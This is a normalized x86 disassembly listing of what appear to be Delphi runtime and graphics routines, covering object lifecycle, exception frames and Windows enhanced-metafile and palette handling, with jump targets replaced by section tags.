mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9ea
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41e9ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea11
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41ea18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41ea68
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41eac0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41ea68
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41eb09
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403070
mov edi eax
mov eax esi
call sub_403070
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ec43
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ec26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407ae4
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec2d
mov al 0x1
sub_41ec5c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4159c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eca4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ecab
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41ecb0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41ece4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4159c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ed2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed36
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41ed5c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41edda
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4138b8
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403078
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4040dc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404284
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ede1
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41ee4c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41eef8
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41eef8
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41eef8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41eecc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov eax [ esi + 0x8 ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41eef8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41375c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ef3c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41375c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ef60
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_4138b8
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4138b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41efbc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41efec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403070
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f58
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_41f020
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4032b4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403128
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
sub_41f09c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_41f12c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403070
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f14c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_41ef60
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f1c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_41d760
mov eax [ ebx + 0xc ]
call sub_403128
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41f210
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_41f284
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_41f09c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_41f09c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413e74
mov edx ebx
mov eax esi
call sub_41f09c
jmp r-xdata
pop esi
pop ebx
retn
sub_41f2e0
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41f304
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41f32c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f433
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4040dc
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41ed5c
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f3b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f43a
lea eax [ ebp - 0x48 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41f3ba
mov eax [ ebp - 0x4 ]
call sub_403128
call sub_4038dc
call sub_403930
mov eax [ ebx + 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f43a
lea eax [ ebp - 0x48 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40333c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41f444
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403078
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402a2c
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_41f4a0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_41f51c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41f32c
mov eax [ ebp - 0x8 ]
push eax
push sub_41f444
push ebp
call sub_41f4a0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f565
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41b7cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41f5a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ea18
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41f5f0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_4205c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41f620
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_4205c8
mov edx esi
mov eax ebx
call sub_413e74
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_4205c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_41f6b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41d4a0
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41d4a0
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41d4a0
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41d4a0
push eax
call SelectPalette
sub_41f74c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41f8f4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_405fa4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_405fa4
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_41f7b0
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41b7cc
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_41f83c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41f8f4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_405fa4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_405fa4
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_41f8a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41fe1c
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415510
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_41fa58
mov edx esi
mov eax ebx
call sub_41f988
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_41f8f4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_4205c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_4205c4
pop esi
pop ebx
retn
sub_41f91c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_41fe1c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_41fa58
mov edx esi
mov eax ebx
call sub_41f988
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_41f988
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41f8f4
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41573c
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_41fa48
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028b8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41573c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41d790
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa4f
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41d790
sub_41fa58
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
